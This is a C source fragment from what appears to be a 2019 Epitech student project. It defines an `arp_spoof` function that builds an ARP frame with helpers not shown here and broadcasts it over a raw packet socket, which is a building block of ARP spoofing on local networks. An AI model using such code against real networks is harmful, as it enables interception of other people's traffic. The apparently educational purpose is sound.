/*
** EPITECH PROJECT, 2019
** spoofing
** File description:
** arp_spoof
*/

#include <stdbool.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <net/ethernet.h> /* the L2 protocols */
#include "arp.h"
#include "packet.h"

static void debug_packet(packet_t *packet)
{
    for (unsigned int i = 0; i < sizeof(arp_header_t) + sizeof(ethernet_header_t); i++) {
        printf("%02x|", packet->buffer[i]);
        if (i % 8 == 0)
            printf(" ");
        if (i % 16 == 0)
            printf("\n");
    }
}

bool arp_spoof(arp_t *arp)
{
    packet_t *packet = malloc(sizeof(packet_t));

    if (packet == NULL)
        return (false);
    packet_configure_ethernet(packet, arp->src_mac_address, BROADCAST_ADDR);
    packet_configure_arp(packet, 1, BROADCAST_ADDR, arp);
    debug_packet(packet);
    if (sendto(arp->fd, packet->buffer, \
        sizeof(arp_header_t) + sizeof(ethernet_header_t), 0, \
        (const struct sockaddr *)arp->address, sizeof(struct sockaddr_ll)) < 0) {
        printf("failed to send\n");
    }
    return (true);
}
